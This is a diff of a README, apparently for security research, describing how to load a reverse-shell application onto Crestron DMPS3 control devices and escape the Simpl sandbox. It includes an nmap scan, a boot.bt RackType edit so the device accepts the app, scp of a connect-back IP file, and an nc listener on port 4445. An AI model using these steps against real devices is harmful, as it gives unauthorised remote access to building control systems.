@@ -8,7 +8,7 @@ In a perfect world, Crestron Simpl applications run in a sandbox and are signed 
 The ports available to the interface can change depending on the device type, and whether you are looking at the control side or the LAN side. If the device has only the LAN interface connected, it will listen with all ports on that interface. Otherwise, the control ports will be listening on the control interface. The key ports are 21, 22, 23, 41794, or 41795.
 
 ```
-Brandons-iMac:~ bperry$ nmap 192.168.1.174
+$ nmap 192.168.1.174
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-01 13:46 CDT
 Nmap scan report for DMPS3-7f81812f.attlocal.net (192.168.1.174)
 Host is up (0.0036s latency).
@@ -49,10 +49,10 @@ ssh crestron@192.168.1.240 progreset
 
 # Other Devices
 
-If you can telnet or SSH into the device, the command prompt will contain the RackType that you can update boot.bt with.
+If you can telnet or SSH into the device, the command prompt will contain the `RackType` that you can update `boot.bt` with.
 
 ```
-bperry@bperry-Precision-T5610:/tmp/zip$ telnet 192.168.1.174
+$ telnet 192.168.1.174
 Trying 192.168.1.174...
 Connected to 192.168.1.174.
 Escape character is '^]'.
@@ -63,7 +63,7 @@ DMPS3-4K-150-C>
 
 ```
 
-In boot.bt, the RackType is in the first stanza and by default is the PRO3.
+In `boot.bt`, the `RackType` is in the first stanza and by default is the `PRO3`.
 
 ```
 [LG_BOOT_DATA]
@@ -73,7 +73,7 @@ NumberSymbols=15
 NumberSignals=33
 RouteFileName=fdsa.rte
 CUZ=1.007.0017
-RackType=PRO3
+RackType=PRO3                 <---------- here
 SymParamVersion=21.007.0017
 NumberParameters=3
 NumRealIntegralParams=0
@@ -83,21 +83,21 @@ NVRAMUsed=0
 [...snip...]
 ```
 
-Replacing PRO3 with the device type will ensure the device does not reject the application.
+Replacing `PRO3` with the device type will ensure the device does not reject the application.
 
 # Using the shell
 
-The shell expects a \User\ip file with the IP address to connect back to. Port 4445 is hardcoded.
+The shell expects a `\User\ip` file with the IP address to connect back to. Port 4445 is hardcoded.
 
 ```
-echo -n 192.168.1.123 > ip
-scp ip crestron@192.168.1.174:/User
+$ echo -n 192.168.1.123 > ip
+$ scp ip crestron@192.168.1.174:/User
 ```
 
 Once the connection is made, you can begin interacting outside of the sandbox.
 
 ```
-Brandons-iMac:~ bperry$ nc -l 4445
+$ nc -l 4445
 Connected
  > ls
 \Network
@@ -122,7 +122,7 @@ Connected
  For instance, compared to the sandbox directory list.
  
  ```
- Brandons-iMac:~ bperry$ telnet 192.168.1.174
+$ telnet 192.168.1.174
 Trying 192.168.1.174...
 Connected to dmps3-7f81812f.attlocal.net.
 Escape character is '^]'.
